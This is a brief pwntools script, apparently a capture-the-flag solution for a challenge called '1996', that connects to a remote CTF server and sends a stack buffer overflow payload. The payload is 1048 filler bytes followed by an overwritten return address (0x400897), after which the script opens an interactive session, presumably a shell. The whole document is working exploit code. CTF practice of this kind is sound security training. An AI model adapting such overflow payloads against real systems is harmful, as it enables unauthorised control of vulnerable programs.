from pwn import *

#r=process("./1996")
r=remote("ctf.j0n9hyun.xyz",3013)
r.recvrepeat(0.8)
payload = "a"*1048
payload += p64(0x400897)
r.sendline(payload)

r.recvrepeat(0.9)
r.interactive()
